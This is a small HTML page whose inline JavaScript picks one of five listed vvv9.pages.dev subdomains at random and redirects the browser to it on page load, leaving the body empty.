<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>多域名随机跳转</title>
    <script type="text/javascript">
        // 定义域名列表
        var domains = [
            "https://2ccb9363.vvv9.pages.dev/",
            "https://860219ce.vvv9.pages.dev/",
            "https://ea1034ae.vvv9.pages.dev/",
            "https://ad0d529d.vvv9.pages.dev/",
            "https://b32df608.vvv9.pages.dev/"
            // 添加更多域名...
        ];
 
        // 随机选择一个域名
        var randomDomain = domains[Math.floor(Math.random() * domains.length)];
 
        // 页面加载完成后跳转
        window.onload = function() {
            window.location.href = randomDomain;
        };
    </script>
</head>
<body>
    <p></p>
</body>
</html>
